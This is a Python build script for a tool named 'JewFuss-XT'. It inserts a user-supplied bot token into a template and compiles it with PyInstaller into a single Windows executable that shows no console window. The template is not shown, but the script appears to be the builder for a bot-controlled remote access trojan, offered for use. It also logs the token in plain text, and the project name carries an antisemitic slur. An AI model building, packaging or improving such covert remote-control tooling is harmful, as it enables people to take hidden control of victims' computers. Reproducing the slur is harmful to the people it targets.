import os
import shutil
import tempfile
import subprocess
import time

template_path = os.path.abspath('./source/JewFuss-XT.template')
output_dir = os.path.abspath('builds')
output_path = os.path.join(output_dir, 'JewFuss-XT.exe')
log_file_path = os.path.join(output_dir, 'easy-compiler-build.log')
token = 'TOKEN = "BOT-TOKEN-GOES-HERE"'
user_input = 'TOKEN = "' + input('Please enter bot token:\n>> ') + '"'

print("\nTemplate path:", template_path +"\n")
print("\nOutput directory:", output_dir +"\n")
print("\nOutput location:", output_path +"\n")

with open(template_path, 'r') as file:
    content = file.read()

content = content.replace(token, user_input)

temp_dir = tempfile.mkdtemp()
temp_file = os.path.join(temp_dir, 'temp.py')

if os.path.exists(output_path):
    timestamp = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime())
    new_name = f"{timestamp}-JewFuss-XT.exe"
    new_path = os.path.join(output_dir, new_name)
    os.rename(output_path, new_path)
    print(f"\nRenaming {os.path.basename(output_path)} to {new_name}\n")
elif not os.path.exists(output_dir):
    print("\nOutput path does not exist, creating one\n")
    os.makedirs(output_dir)

with open(temp_file, 'w') as file:
    file.write(content)

subprocess.run(['pyinstaller', temp_file, '--onefile', '--windowed', '--noconsole', '--distpath=builds', '--workpath=data' , '-n=JewFuss-XT.exe'])
shutil.rmtree(temp_dir)

with open(log_file_path, 'a') as log_file:
    log_file.write(f"{time.strftime('%Y-%m-%d-%H-%M-%S')}: Token: {user_input} JewFuss-XT.exe\n")
